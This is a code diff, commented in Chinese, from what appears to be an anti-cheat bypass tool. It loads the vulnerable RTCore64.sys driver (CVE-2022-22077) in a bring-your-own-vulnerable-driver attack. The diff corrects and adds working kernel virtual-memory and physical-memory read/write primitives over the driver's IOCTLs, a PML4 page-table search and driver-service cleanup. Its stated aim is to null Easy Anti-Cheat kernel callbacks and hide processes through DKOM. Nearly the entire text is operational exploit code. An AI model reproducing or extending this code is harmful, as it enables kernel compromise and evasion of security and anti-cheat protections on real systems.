@@ -4,7 +4,8 @@
 // 技术栈:
 //   1. RTCore64.sys BYOVD 加载 (合法签名漏洞驱动)
 //   2. CR3 页表遍历: VA→PA 转换 (PML4→PDPT→PD→PT)
-//   3. 物理内存 R/W: IOCTL 0x80002048/0x4C 读写任意物理地址 (CVE-2022-22077, FMT_48B_PA_AT_00)
+//   3. 虚拟内存 R/W: IOCTL 0x80002000 读写任意内核虚拟地址
+//   4. 物理内存 R/W: IOCTL 0x80002048/0x4C 读写任意物理地址 (CVE-2022-22077)
 //   4. Sigscan ObRegisterCallbacks → 定位 ObpCallbackArrayHead
 //   5. 遍历回调数组 → NULL EAC 的所有注册回调
 //   6. DKOM EPROCESS 断链 (可选, 触发 PatchGuard)
@@ -65,10 +66,12 @@ extern void*    g_vehHandlerPageVA;
 namespace stealth {
 
 // ============================================================
-// v3.69: 受保护用户态区域全局变量
+// ★ v3.69/v3.117: 受保护用户态区域全局变量 — 固定数组, 避免 std::vector CRT 堆依赖
 // 注意: 单线程访问, 无需同步
+// 注意: MAX_PROTECTED_REGIONS 已在 byovd_kernel.h 中定义, 此处不重复定义
 // ============================================================
-std::vector<ProtectedUserRegion> g_protectedUserRegions;
+ProtectedUserRegion g_protectedUserRegions[MAX_PROTECTED_REGIONS] = {};
+int g_protectedRegionCount = 0;
 
 // ============================================================
 // PML4 物理地址获取 — 通过 IOCTL 扫描物理内存
@@ -142,51 +145,141 @@ enum class RTCore64Format {
 // ★ v3.100: 存储 IOCTL 探测结果 — 让 MapPhysical 使用正确的格式
 static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;
 
+// ★ v3.114: 虚拟内存 R/W 用 IOCTL 0x80002000 (sub-code 0x00)
+//   物理内存 R/W 用 IOCTL 0x80002048/0x8000204C (sub-code 0x12/0x13)
+//   ReadKernelVA/WriteKernelVA 必须使用虚拟内存 IOCTL,
+//   否则 MmMapIoSpace 将内核VA当作物理地址映射 → 蓝屏
+// ★ v3.120: 移至 VirtualReadViaIOCTL 之前 — 确保在第一次使用前定义
+static const uint32_t IOCTL_VIRTUAL_MEM   = 0x80002000;   // 虚拟内存读/写
+static const uint32_t IOCTL_PHYSICAL_READ  = 0x80002048; // 物理内存读取 (MmMapIoSpace)
+static const uint32_t IOCTL_PHYSICAL_WRITE = 0x8000204C; // 物理内存写入 (MmMapIoSpace)
+
 // ★ v3.104: 存储探测到的 IOCTL 码 (读/写分开)
 static uint32_t g_probedReadIoctl  = 0;
 static uint32_t g_probedWriteIoctl = 0;
 
-// ★ v3.109: 内核虚拟地址读取 — 通过 IOCTL 0x80002048 读取内核虚拟内存
-//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
-//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
+// ★ v3.115: 虚拟内存读取 — 使用 IOCTL 0x80002000 (sub-code 0x00)
+//   正确的 48 字节输入格式 (与物理内存 IOCTL 格式不同):
+//     +0x00: uint32_t size (1, 2, 或 4 字节)
+//     +0x04: uint32_t pad (设为 0)
+//     +0x08: uint64_t kernel virtual address
+//     +0x10: uint64_t value (输出: 读取的值)
+//     +0x18: pad[28] (未使用)
 //   注意: 驱动不支持 QWORD 单次读取; 64位值通过两次 DWORD 读取完成
-//   参考: https://github.com/grisuno/CVE-2022-22077
-static bool KernelVAReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
-                                  uint64_t kernelVA, void* outBuf, size_t size) {
-    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;
+static bool VirtualReadViaIOCTL(HANDLE hDevice, uint64_t kernelVA, void* outBuf, size_t size) {
+    if (hDevice == INVALID_HANDLE_VALUE) return false;
 
     size_t bytesRead = 0;
 
     for (size_t off = 0; off < size; ) {
         // 每次读取最多 4 bytes (DWORD) — 驱动不支持 QWORD 单次读取
         size_t chunk = (size - off > 4) ? 4 : (size - off);
-        // sizeType: 1=BYTE, 2=WORD, 4=DWORD (exploit 使用 2=WORD, 4=DWORD)
-        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;
+        uint32_t readSize = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;
 
-        // 构造 IOCTL 输入 (48字节)
-        uint8_t inBuf[48] = {};
-        // offset +0x00: pad0 (unused, set to 0)
-        // offset +0x08: kernel virtual address
-        *(uint64_t*)(inBuf + 0x08) = kernelVA + off;
-        // offset +0x18: sizeType (1=BYTE, 2=WORD, 4=DWORD)
-        *(uint32_t*)(inBuf + 0x18) = sizeType;
-        // offset +0x1C: value (output)
+        // 构造 IOCTL 输入 (48字节, 虚拟内存格式)
+        //   +0x00: size (驱动读取此字段决定读取字节数)
+        //   +0x08: kernel virtual address
+        //   +0x10: output value (驱动写入读取结果)
+        uint8_t buf[48] = {};
+        *(uint32_t*)(buf + 0x00) = readSize;
+        *(uint64_t*)(buf + 0x08) = kernelVA + off;
 
-        uint8_t outBufTmp[48] = {};
-        memcpy(outBufTmp, inBuf, sizeof(inBuf));
         DWORD bytesRet = 0;
-        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
-                                  outBufTmp, sizeof(outBufTmp),
-                                  outBufTmp, sizeof(outBufTmp),
+        BOOL ok = DeviceIoControl(hDevice, IOCTL_VIRTUAL_MEM,
+                                  buf, sizeof(buf),
+                                  buf, sizeof(buf),
                                   &bytesRet, nullptr);
         if (!ok) {
-            ByovdDiag("BYOVD:KVARead: ioctl=0x%08X va=0x%llX FAILED err=%u\n",
-                      ioctlCode, (unsigned long long)(kernelVA + off), GetLastError());
+            ByovdDiag("BYOVD:VirtualRead: va=0x%llX off=%zu FAILED err=%u\n",
+                      (unsigned long long)kernelVA, off, GetLastError());
+            return false;
+        }
+
+        // 读取结果在 +0x10 (uint64_t)
+        uint64_t readVal = *(uint64_t*)(buf + 0x10);
+        memcpy((uint8_t*)outBuf + off, &readVal, (readSize < chunk) ? readSize : (uint32_t)chunk);
+        off += chunk;
+        bytesRead += chunk;
+    }
+    return bytesRead > 0;
+}
+
+// ★ v3.115: 虚拟内存写入 — 使用 IOCTL 0x80002000 (sub-code 0x00)
+//   正确的 48 字节输入格式:
+//     +0x00: uint32_t size (1, 2, 或 4 字节)
+//     +0x04: uint32_t pad (设为 0)
+//     +0x08: uint64_t kernel virtual address
+//     +0x10: uint64_t value (输入: 要写入的值)
+//     +0x18: pad[28] (未使用)
+static bool VirtualWriteViaIOCTL(HANDLE hDevice, uint64_t kernelVA, const void* inBuf, size_t size) {
+    if (hDevice == INVALID_HANDLE_VALUE) return false;
+
+    for (size_t off = 0; off < size; ) {
+        // 每次写入最多 4 bytes (DWORD)
+        size_t chunk = (size - off > 4) ? 4 : (size - off);
+        uint32_t writeSize = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;
+
+        // 读取要写入的值 (最多 4 bytes)
+        uint64_t writeVal = 0;
+        memcpy(&writeVal, (const uint8_t*)inBuf + off, chunk);
+
+        // 构造 IOCTL 输入 (48字节, 虚拟内存格式)
+        uint8_t buf[48] = {};
+        *(uint32_t*)(buf + 0x00) = writeSize;
+        *(uint64_t*)(buf + 0x08) = kernelVA + off;
+        *(uint64_t*)(buf + 0x10) = writeVal;
+
+        DWORD bytesRet = 0;
+        BOOL ok = DeviceIoControl(hDevice, IOCTL_VIRTUAL_MEM,
+                                  buf, sizeof(buf),
+                                  buf, sizeof(buf),
+                                  &bytesRet, nullptr);
+        if (!ok) {
+            ByovdDiag("BYOVD:VirtualWrite: va=0x%llX off=%zu FAILED err=%u\n",
+                      (unsigned long long)kernelVA, off, GetLastError());
+        }
+        off += chunk;
+    }
+    return true;
+}
+
+// ★ v3.115: 物理内存读取 — 使用 IOCTL 0x80002048 (sub-code 0x12)
+//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
+//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
+//   注意: 驱动不支持 QWORD 单次读取; 64位值通过两次 DWORD 读取完成
+//   参考: https://github.com/grisuno/CVE-2022-22077
+static bool PhysicalReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
+                                  uint64_t physAddr, void* outBuf, size_t size) {
+    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;
+
+    size_t bytesRead = 0;
+
+    for (size_t off = 0; off < size; ) {
+        size_t chunk = (size - off > 4) ? 4 : (size - off);
+        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;
+
+        // 构造 IOCTL 输入 (48字节, 物理内存格式)
+        //   +0x00: pad0[8] (unused)
+        //   +0x08: physical address
+        //   +0x18: sizeType (1=BYTE, 2=WORD, 4=DWORD)
+        //   +0x1C: value (output)
+        uint8_t buf[48] = {};
+        *(uint64_t*)(buf + 0x08) = physAddr + off;
+        *(uint32_t*)(buf + 0x18) = sizeType;
+
+        DWORD bytesRet = 0;
+        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
+                                  buf, sizeof(buf),
+                                  buf, sizeof(buf),
+                                  &bytesRet, nullptr);
+        if (!ok) {
+            ByovdDiag("BYOVD:PhysRead: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
+                      ioctlCode, (unsigned long long)(physAddr + off), GetLastError());
             return false;
         }
 
         // 读取结果在 offset +0x1C (value 字段, 总是 DWORD)
-        uint32_t readVal = *(uint32_t*)(outBufTmp + 0x1C);
+        uint32_t readVal = *(uint32_t*)(buf + 0x1C);
         uint32_t validBytes = (sizeType == 1) ? 1 : (sizeType == 2) ? 2 : 4;
         memcpy((uint8_t*)outBuf + off, &readVal, (validBytes < chunk) ? validBytes : (uint32_t)chunk);
         off += chunk;
@@ -195,43 +288,35 @@ static bool KernelVAReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
     return bytesRead > 0;
 }
 
-// ★ v3.109: 内核虚拟地址写入 — 通过 IOCTL 0x8000204C 写入内核虚拟内存
+// ★ v3.115: 物理内存写入 — 使用 IOCTL 0x8000204C (sub-code 0x13)
 //   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
 //   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
 //   注意: 驱动不支持 QWORD 单次写入; 64位值通过两次 DWORD 写入完成
-static bool KernelVAWriteViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
-                                   uint64_t kernelVA, const void* inBuf, size_t size) {
+static bool PhysicalWriteViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
+                                   uint64_t physAddr, const void* inBuf, size_t size) {
     if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;
 
     for (size_t off = 0; off < size; ) {
-        // 每次写入最多 4 bytes (DWORD) — 驱动不支持 QWORD 单次写入
         size_t chunk = (size - off > 4) ? 4 : (size - off);
-        // sizeType: 1=BYTE, 2=WORD, 4=DWORD
         uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;
 
-        // 读取要写入的值 (最多 4 bytes)
         uint32_t writeVal = 0;
         memcpy(&writeVal, (const uint8_t*)inBuf + off, chunk);
 
-        // 构造 IOCTL 输入 (48字节)
-        uint8_t outBuf[48] = {};
-        // offset +0x00: pad0 (unused)
-        // offset +0x08: kernel virtual address
-        *(uint64_t*)(outBuf + 0x08) = kernelVA + off;
-        // offset +0x18: sizeType
-        *(uint32_t*)(outBuf + 0x18) = sizeType;
-        // offset +0x1C: value to write
-        *(uint32_t*)(outBuf + 0x1C) = writeVal;
+        // 构造 IOCTL 输入 (48字节, 物理内存格式)
+        uint8_t buf[48] = {};
+        *(uint64_t*)(buf + 0x08) = physAddr + off;
+        *(uint32_t*)(buf + 0x18) = sizeType;
+        *(uint32_t*)(buf + 0x1C) = writeVal;
 
         DWORD bytesRet = 0;
         BOOL ok = DeviceIoControl(hDevice, ioctlCode,
-                                  outBuf, sizeof(outBuf),
-                                  outBuf, sizeof(outBuf),
+                                  buf, sizeof(buf),
+                                  buf, sizeof(buf),
                                   &bytesRet, nullptr);
         if (!ok) {
-            ByovdDiag("BYOVD:KVAWrite: ioctl=0x%08X va=0x%llX FAILED err=%u\n",
-                      ioctlCode, (unsigned long long)(kernelVA + off), GetLastError());
-            // 继续尝试, 不中断整个操作
+            ByovdDiag("BYOVD:PhysWrite: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
+                      ioctlCode, (unsigned long long)(physAddr + off), GetLastError());
         }
         off += chunk;
     }
@@ -335,19 +420,18 @@ static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr
     return false;
 }
 
-// ★ v3.109: 安全 IOCTL 探测 — 使用正确的内核VA读取格式
-//   参考: CVE-2022-22077, https://github.com/grisuno/CVE-2022-22077
-//   IOCTL 0x80002048: 读取内核虚拟地址 (48字节输入)
-//   结构: pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
-//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考 exploit.c)
+// ★ v3.115: 安全 IOCTL 探测 — 使用 PhysicalReadViaIOCTL 验证物理内存读取
+//   探测 IOCTL 0x80002048/0x4C/0x30/0x34 哪个能成功读取物理内存
 //   - 每次探测间 Sleep(50ms) 防止资源耗尽
+//   - 最多 8 次探测, 立即 abort 资源耗尽 (err=1450)
 // ★ v3.113: 改用 SAFE_TEST_PHYS (0x100000) 代替 0xFFFFF800... 虚拟地址
 //   驱动 IOCTL 期望物理地址, 传入非法物理地址导致 MmMapIoSpace 蓝屏
 static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
     int totalProbes = 0;
     const int MAX_PROBES = 8;
-    // 对于每个 IOCTL 码, 只测一次 (统一使用 SAFE_TEST_PHYS 物理地址)
     (void)outTestVA; // 未使用, 保留兼容
+
+    uint8_t testBuf[0x1000] = {};
 
     for (int ci = 0; ci < g_ioctlCandidateCount && totalProbes < MAX_PROBES; ci++) {
         uint32_t ioctl = g_ioctlCandidates[ci];
@@ -357,20 +441,11 @@ static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
 
         totalProbes++;
 
-        // 构造 IOCTL 输入 (48字节)
-        uint8_t inBuf[48] = {};
-        // offset +0x08: physical address (驱动用 MmMapIoSpace 映射)
-        *(uint64_t*)(inBuf + 0x08) = SAFE_TEST_PHYS;
-        // offset +0x18: sizeType = 4 (DWORD)
-        *(uint32_t*)(inBuf + 0x18) = 4;
-
-        DWORD bytesRet = 0;
-        BOOL ok = DeviceIoControl(hDevice, ioctl,
-                                  inBuf, sizeof(inBuf),
-                                  inBuf, sizeof(inBuf),
-                                  &bytesRet, nullptr);
+        // ★ v3.115: 使用 PhysicalReadViaIOCTL 验证物理内存读取
+        memset(testBuf, 0, sizeof(testBuf));
+        bool ok = PhysicalReadViaIOCTL(hDevice, ioctl, SAFE_TEST_PHYS, testBuf, 4);
         DWORD err = GetLastError();
-        uint32_t readVal = *(uint32_t*)(inBuf + 0x1C);
+        uint32_t readVal = *(uint32_t*)testBuf;
 
         ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u phys=0x%llX val=0x%08X probe=%d/%d\n",
                   ioctl, (int)ok, err, (unsigned long long)SAFE_TEST_PHYS, readVal, totalProbes, MAX_PROBES);
@@ -395,13 +470,12 @@ static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
 }
 
 // 轻量物理读取: 直接 IOCTL, 无日志/缓存/overlap 检查
-// ★ v3.108: 改为使用 KernelVAReadViaIOCTL 直接读取内核VA
+// ★ v3.115: 使用 PhysicalReadViaIOCTL 读取物理内存, 不再错误使用虚拟内存 IOCTL
 static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
                            uint64_t physAddr, uint8_t* outBuf4K) {
     if (!outBuf4K) return false;
-    // 注意: 此函数读取物理地址, 但 IOCTL 读取内核VA
-    // 尝试用 KernelVAReadViaIOCTL 直接通过物理地址读取
-    return KernelVAReadViaIOCTL(hDevice, ioctlCode, physAddr, outBuf4K, 0x1000);
+    // ★ v3.115: 使用物理内存 IOCTL (0x80002048) 读取物理地址
+    return PhysicalReadViaIOCTL(hDevice, ioctlCode, physAddr, outBuf4K, 0x1000);
 }
 
 // 检查一个物理页是否为当前进程的 PML4 表
@@ -481,6 +555,7 @@ static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
 
 // 获取 PML4 物理地址 (懒初始化 + 缓存)
 // ★ 不能是 static: byovd_kernel.h 需要 friend 声明
+// ★ v3.115: 使用 IOCTL_PHYSICAL_READ (0x80002048) 扫描物理内存, 不再使用虚拟内存 IOCTL
 uint64_t ReadCR3() {
     static uint64_t s_cachedPML4 = 0;
     if (s_cachedPML4) return s_cachedPML4;
@@ -488,10 +563,8 @@ uint64_t ReadCR3() {
     auto& kma = KernelMemoryAccessor::Instance();
     // 注意: 此时 m_active=true, m_hDevice 有效 (Initialize 中调用)
 
-    // ★ v3.84: 通过 IOCTL 扫描物理内存获取 PML4, 避免特权指令 crash
-    //   ReadPhysical(0x1000, ...) 会走 MapPhysical → IOCTL → 映射成功即可读
-    //   但更直接的方式: 用 raw IOCTL 扫描
-    s_cachedPML4 = FindPML4Physical(kma.m_hDevice, kma.m_driverInfo.ioctlCode);
+    // ★ v3.115: 使用 IOCTL_PHYSICAL_READ (0x80002048) 扫描物理内存寻找 PML4
+    s_cachedPML4 = FindPML4Physical(kma.m_hDevice, IOCTL_PHYSICAL_READ);
 
     ByovdDiag("BYOVD:ReadCR3: PML4 phys=0x%llX\n",
               (unsigned long long)s_cachedPML4);
@@ -576,12 +649,14 @@ private:
 // BYOVD 驱动定义
 // ============================================================
 
+// (IOCTL 常量定义已移至文件顶部 VirtualReadViaIOCTL 之前)
+
 const BYOVDDriverInfo BYOVDDrivers::RTCore64 = {
     L"RTCore64Svc",
     L"RTCore64 Micro-Star Driver",
     L"\\\\.\\RTCore64",
     L"RTCore64.sys",
-    0x80002048,   // ★ v3.105: 物理内存读取 IOCTL (CVE-2022-22077)
+    IOCTL_VIRTUAL_MEM,   // ★ v3.114: 使用虚拟内存 IOCTL (0x80002000)
     true
 };
 
@@ -745,11 +820,14 @@ static void ForceRemoveRTCore64Services() {
         &serviceCount, &resumeHandle, nullptr);
     if (bytesNeeded == 0) { CloseServiceHandle(hSCM); return; }
 
-    std::vector<BYTE> buf(bytesNeeded + 0x100);
-    auto* services = (ENUM_SERVICE_STATUS_PROCESSW*)buf.data();
+    // ★ v3.120: VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
+    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, bytesNeeded + 0x100, MEM_COMMIT, PAGE_READWRITE);
+    if (!buf) { CloseServiceHandle(hSCM); return; }
+    auto* services = (ENUM_SERVICE_STATUS_PROCESSW*)buf;
     if (!EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER,
-        SERVICE_STATE_ALL, buf.data(), (DWORD)buf.size(), &bytesNeeded,
+        SERVICE_STATE_ALL, buf, (DWORD)(bytesNeeded + 0x100), &bytesNeeded,
         &serviceCount, &resumeHandle, nullptr)) {
+        VirtualFree(buf, 0, MEM_RELEASE);
         CloseServiceHandle(hSCM);
         return;
     }
@@ -796,6 +874,7 @@ static void ForceRemoveRTCore64Services() {
             if (pNtUnloadDriver) pNtUnloadDriver(&us);
         }
     }
+    VirtualFree(buf, 0, MEM_RELEASE);
     CloseServiceHandle(hSCM);
 }
 
@@ -938,10 +1017,10 @@ struct PhysMemMapping {
     uint8_t* virtAddr;       // 映射到的用户态虚拟地址
 };
 
-static std::vector<PhysMemMapping> g_physMappings;
-
-// 最大缓存的物理内存映射数量 (LRU淘汰)
+// ★ v3.118: 固定数组, 避免 std::vector CRT 堆依赖
 static constexpr size_t MAX_PHYS_MAPPINGS = 64;
+static PhysMemMapping g_physMappings[MAX_PHYS_MAPPINGS] = {};
+static int g_physMappingCount = 0;
 
 bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
                                         uint8_t** outVirtAddr) {
@@ -951,8 +1030,9 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
     uint64_t alignedAddr = physAddr & ~0xFFFULL;
     uint32_t alignedSize = ((physAddr + size - alignedAddr + 0xFFF) & ~0xFFF);
 
-    // 检查是否已映射
-    for (auto& m : g_physMappings) {
+    // 检查是否已映射 (固定数组遍历)
+    for (int mi = 0; mi < g_physMappingCount; mi++) {
+        PhysMemMapping& m = g_physMappings[mi];
         if (m.physAddr == alignedAddr && m.size >= alignedSize) {
             *outVirtAddr = m.virtAddr + (physAddr - alignedAddr);
             return true;
@@ -967,8 +1047,8 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
     SIZE_T   savedBackupLen    = ::g_backupLen;
     uint8_t* savedBackupCodeBase = ::g_backupCodeBase;
 
-    // ★ v3.105: 使用探测到的 IOCTL 码
-    uint32_t mapIoctl = g_probedReadIoctl ? g_probedReadIoctl : m_driverInfo.ioctlCode;
+    // ★ v3.114: 物理内存映射使用 IOCTL_PHYSICAL_READ (0x80002048)
+    uint32_t mapIoctl = g_probedReadIoctl ? g_probedReadIoctl : IOCTL_PHYSICAL_READ;
     ByovdDiag("BYOVD:Map: IOCTL REQ phys=0x%llX size=%u fmt=%d ioctl=0x%08X\n",
         (unsigned long long)alignedAddr, alignedSize, (int)g_probedIoctlFormat, mapIoctl);
 
@@ -993,19 +1073,28 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
         return false;
     }
 
-    // 缓存映射
-    PhysMemMapping mapping;
-    mapping.physAddr = alignedAddr;
-    mapping.size     = alignedSize;
-    mapping.virtAddr = mappedAddr;
-    g_physMappings.push_back(mapping);
+    // 缓存映射 (固定数组)
+    if (g_physMappingCount < MAX_PHYS_MAPPINGS) {
+        PhysMemMapping& mapping = g_physMappings[g_physMappingCount];
+        mapping.physAddr = alignedAddr;
+        mapping.size     = alignedSize;
+        mapping.virtAddr = mappedAddr;
+        g_physMappingCount++;
+    } else {
+        ByovdDiag("BYOVD:Map: MAX_PHYS_MAPPINGS (%zu) reached, evicting oldest\n", MAX_PHYS_MAPPINGS);
+        // LRU: 移除最早条目, 新条目放在末尾
+        memmove(&g_physMappings[0], &g_physMappings[1],
+                (MAX_PHYS_MAPPINGS - 1) * sizeof(PhysMemMapping));
+        g_physMappings[MAX_PHYS_MAPPINGS - 1] = {alignedAddr, alignedSize, mappedAddr};
+        // count 不变
+    }
 
     // ★ v3.78: 检测 IOCTL 映射是否覆盖了受保护区 (DLL代码/备份缓冲区)
     //   RTCore64 驱动已通过 MmMapIoSpace/MDL 修改了 PTE — 破坏已发生!
     //   检测到重叠后, 先从备份恢复被破坏的页面, 再返回 false
     bool doesOverlap = IsOverlappingProtectedRegion((uintptr_t)mappedAddr, alignedSize);
-    ByovdDiag("BYOVD:Map: overlapCheck=%d (regions=%llu)\n",
-        (int)doesOverlap, (unsigned long long)g_protectedUserRegions.size());
+    ByovdDiag("BYOVD:Map: overlapCheck=%d (regions=%d)\n",
+        (int)doesOverlap, g_protectedRegionCount);
 
     if (doesOverlap) {
         ByovdDiag("BYOVD:MapPhysical: OVERLAP! mappedVA=0x%llX size=%u phys=0x%llX\n",
@@ -1073,14 +1162,16 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
             ByovdDiag("BYOVD:Map: no backup available for restore\n");
         }
 
-        g_physMappings.pop_back();
+        if (g_physMappingCount > 0) g_physMappingCount--;
         return false;
     }
 
-    // LRU 淘汰
-    if (g_physMappings.size() > MAX_PHYS_MAPPINGS) {
+    // LRU 淘汰 (固定数组)
+    if (g_physMappingCount > MAX_PHYS_MAPPINGS) {
         // 不释放映射 (内核驱动管理), 只从列表中移除
-        g_physMappings.erase(g_physMappings.begin());
+        memmove(&g_physMappings[0], &g_physMappings[1],
+                (MAX_PHYS_MAPPINGS - 1) * sizeof(PhysMemMapping));
+        g_physMappingCount = MAX_PHYS_MAPPINGS;
     }
 
     *outVirtAddr = mappedAddr + (physAddr - alignedAddr);
@@ -1088,45 +1179,40 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
 }
 
 bool KernelMemoryAccessor::ReadPhysical(uint64_t physAddr, void* outBuf, size_t size) {
-    // ★ v3.108: 物理内存读取 — 通过内核VA读取 (先转换VA→PA再读取)
-    //   此函数不再通过直接IOCTL读取物理内存, 而是通过内核VA路径
-    //   注意: 需要先有有效的VA→PA映射
+    // ★ v3.115: 物理内存读取 — 使用 PhysicalReadViaIOCTL (IOCTL 0x80002048, sub-code 0x12)
+    //   物理地址通过 MmMapIoSpace 映射, 与虚拟地址 IOCTL 分离
     if (m_hDevice == INVALID_HANDLE_VALUE) return false;
-    // 尝试通过内核VA读取: 构造一个指向物理地址的内核VA
-    // 实际上, 直接物理内存读取需要 MmMapIoSpace, 此IOCTL不支持
-    // 回退到尝试通过 IOCTL 直接读取
-    uint32_t ioctl = g_probedReadIoctl ? g_probedReadIoctl : m_driverInfo.ioctlCode;
-    // 注意: KernelVAReadViaIOCTL 读取的是内核VA, 不是物理地址
-    // 此函数仅用于兼容, 实际物理内存读取可能失败
-    return KernelVAReadViaIOCTL(m_hDevice, ioctl, physAddr, outBuf, size);
+    uint32_t ioctl = g_probedReadIoctl ? g_probedReadIoctl : IOCTL_PHYSICAL_READ;
+    return PhysicalReadViaIOCTL(m_hDevice, ioctl, physAddr, outBuf, size);
 }
 
 bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, size_t size) {
+    // ★ v3.115: 物理内存写入 — 使用 PhysicalWriteViaIOCTL (IOCTL 0x8000204C, sub-code 0x13)
     if (m_hDevice == INVALID_HANDLE_VALUE) return false;
-    uint32_t writeIoctl = g_probedWriteIoctl ? g_probedWriteIoctl : m_driverInfo.ioctlCode;
-    return KernelVAWriteViaIOCTL(m_hDevice, writeIoctl, physAddr, inBuf, size);
+    uint32_t writeIoctl = g_probedWriteIoctl ? g_probedWriteIoctl : IOCTL_PHYSICAL_WRITE;
+    return PhysicalWriteViaIOCTL(m_hDevice, writeIoctl, physAddr, inBuf, size);
 }
 
 // ============================================================
 // 内核虚拟地址读写 (通过 IOCTL 直接读写内核VA)
-// IOCTL 0x80002048 读取内核虚拟地址, 无需 VA→PA 转换
+// ★ v3.114: 使用 IOCTL_VIRTUAL_MEM (0x80002000) 虚拟内存 IOCTL,
+//   不再使用 IOCTL_PHYSICAL_READ (0x80002048) — 后者用 MmMapIoSpace
+//   将内核VA当作物理地址映射, 导致蓝屏
 // ============================================================
 
 bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) {
-    // ★ v3.108: 直接通过 IOCTL 读取内核虚拟地址, 无需 VA→PA 转换
-    //   参考: CVE-2022-22077 exploit — 0x80002048 直接读取内核VA
+    // ★ v3.115: 使用 VirtualReadViaIOCTL 直接读取内核VA (IOCTL 0x80002000, sub-code 0x00)
+    //   不再使用 IOCTL_PHYSICAL_READ 格式 — 后者用 MmMapIoSpace 将内核VA当作物理地址映射 → 蓝屏
     if (!m_active) return false;
     if (va < 0xFFFF800000000000ULL) return false; // 非法内核地址
-    uint32_t ioctl = g_probedReadIoctl ? g_probedReadIoctl : m_driverInfo.ioctlCode;
-    return KernelVAReadViaIOCTL(m_hDevice, ioctl, va, outBuf, size);
+    return VirtualReadViaIOCTL(m_hDevice, va, outBuf, size);
 }
 
 bool KernelMemoryAccessor::WriteKernelVA(uint64_t va, const void* inBuf, size_t size) {
-    // ★ v3.108: 直接通过 IOCTL 写入内核虚拟地址
+    // ★ v3.115: 使用 VirtualWriteViaIOCTL 直接写入内核VA (IOCTL 0x80002000, sub-code 0x00)
     if (!m_active) return false;
     if (va < 0xFFFF800000000000ULL) return false;
-    uint32_t ioctl = g_probedWriteIoctl ? g_probedWriteIoctl : m_driverInfo.ioctlCode;
-    return KernelVAWriteViaIOCTL(m_hDevice, ioctl, va, inBuf, size);
+    return VirtualWriteViaIOCTL(m_hDevice, va, inBuf, size);
 }
 
 // ============================================================
@@ -1139,35 +1225,107 @@ uint64_t KernelMemoryAccessor::GetNtoskrnlBase() {
     return m_ntosBase;
 }
 
-uint64_t KernelMemoryAccessor::GetKernelModuleBase(const std::string& moduleName) {
-    // v3.65: 使用 EnumDeviceDrivers — 比手动解析 SystemModuleInformation 更可靠
-    // 之前的 NtQuerySystemInformation class=11 方法在 MinGW/manual-map 下不稳定
-    LPVOID drivers[1024];
-    DWORD cbNeeded = 0;
+// ★ v3.116: 使用 VirtualAlloc 替代 std::vector — 避免手动映射 DLL 上下文中 CRT 堆未初始化导致崩溃
+//   修复 SYSTEM_MODULE_ENTRY 结构偏移: ImageName 在 +0x28, 非 +0x2C; 条目大小 0x128 非 0x12C
+//   参数改为 const char* — 避免调用方构造临时 std::string (CRT 堆分配可能失败)
+uint64_t KernelMemoryAccessor::GetKernelModuleBase(const char* moduleName) {
+    typedef LONG(NTAPI* NtQuerySystemInfo_t)(ULONG, PVOID, ULONG, PULONG);
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    if (!ntdll) return 0;
+    auto pNtQsi = (NtQuerySystemInfo_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
+    if (!pNtQsi) return 0;
 
-    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
